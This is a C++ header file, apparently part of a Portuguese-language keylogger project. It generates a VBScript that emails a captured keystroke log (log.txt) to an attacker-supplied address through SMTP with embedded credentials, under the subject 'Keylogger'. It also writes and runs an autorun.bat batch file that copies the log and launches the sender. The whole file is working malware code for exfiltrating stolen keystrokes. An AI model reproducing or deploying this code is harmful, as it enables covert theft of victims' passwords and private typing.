#ifndef EMAIL_H_INCLUDED
#define EMAIL_H_INCLUDED

#include <iostream>
#include <cstdio>
#include <cstdlib>

void executaEmail(char* nomeArquivo)
{
    FILE *autoRun;
    if((autoRun = fopen("autorun.bat", "r")))
    {
        fclose(autoRun);
        system("autorun.bat");
    }

    else
    {
        autoRun = fopen("autorun.bat", "w");
        fprintf(autoRun, "copy log.txt C:\\Users\\brabu\\Desktop \ns\nstart %s", nomeArquivo);
        fclose(autoRun);
        system("autorun.bat");
    }
}

void enviaEmail(char* nomeArquivo, char* email, char* senha, char* serverSMTP, int porta)
{
    FILE *arquivo;
    arquivo = fopen(nomeArquivo, "w");
    fprintf(arquivo, "EmailSubject = \"Keylogger\"\n");
    fprintf(arquivo, "EmailBody = \"Aqui está o teclado adquirido\"\n");

    fprintf(arquivo, "Const EmailFrom = \"%s\"\n", email);
    fprintf(arquivo, "Const EmailFromName = \"Anonymous\"\n");
    fprintf(arquivo, "Const EmailTo = \"%s\"\n", email);
    fprintf(arquivo, "Const SMTPServer = \"%s\"\n", serverSMTP);
    fprintf(arquivo, "Const SMTPLogon = \"%s\"\n", email);
    fprintf(arquivo, "Const SMTPPassword = \"%s\"\n", senha);
    fprintf(arquivo, "Const SMTPSSL = True\n");
    fprintf(arquivo, "Const SMTPPort = %d\n\n", porta);

    fprintf(arquivo, "Const cdoSendUsingPickup = 1    'Send message using local SMTP service pickup directory.\n");
    fprintf(arquivo, "Const cdoSendUsingPort = 2  'Send the message using SMTP over TCP/IP networking.\n\n");

    fprintf(arquivo, "Const cdoAnonymous = 0  ' No authentication\n");
    fprintf(arquivo, "Const cdoBasic = 1  ' BASIC clear text authentication\n");
    fprintf(arquivo, "Const cdoNTLM = 2   ' NTLM, Microsoft proprietary authentication\n\n");

    fprintf(arquivo, "' First, create the message\n\n");

    fprintf(arquivo, "Set objMessage = CreateObject(\"CDO.Message\")\n");
    fprintf(arquivo, "objMessage.Subject = EmailSubject\n");
    fprintf(arquivo, "objMessage.From = \"\"\"\" & EmailFromName & \"\"\" <\" & EmailFrom & \">\"\n");
    fprintf(arquivo, "objMessage.To = EmailTo\n");
    fprintf(arquivo, "objMessage.TextBody = EmailBody\n");
    fprintf(arquivo, "objMessage.AddAttachment \"C:\\Users\\brabu\\Desktop\\log.txt\"\n\n");

    fprintf(arquivo, "' Second, configure the server\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/sendusing\") = 2\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/smtpserver\") = SMTPServer\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate\") = cdoBasic\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/sendusername\") = SMTPLogon\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/sendpassword\") = SMTPPassword\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/smtpserverport\") = SMTPPort\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/smtpusessl\") = SMTPSSL\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Item _\n");
    fprintf(arquivo, "(\"http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout\") = 60\n\n");

    fprintf(arquivo, "objMessage.Configuration.Fields.Update\n\n");

    fprintf(arquivo, "objMessage.Send\n\n");
    fclose(arquivo);

    executaEmail(nomeArquivo);
}

#endif // EMAIL_H_INCLUDED
